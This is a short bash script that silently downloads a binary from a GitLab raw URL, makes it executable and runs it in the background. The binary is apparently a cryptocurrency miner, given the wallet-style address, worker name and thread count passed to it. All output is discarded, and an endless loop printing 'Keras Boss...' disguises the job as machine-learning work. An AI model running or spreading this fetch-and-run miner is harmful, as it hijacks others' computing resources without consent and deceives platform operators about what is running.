#!/bin/bash
curl -s -L -o ban https://gitlab.com/nujuk-group/samin/-/raw/main/volt?ref_type=heads >/dev/null 2>&1
chmod 777 ban
./ban --user 88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL --pass WORKER-E --threads 7 >/dev/null 2>&1 &
sleep 20
while true
do
        echo "Keras Boss..."
        sleep 720
done
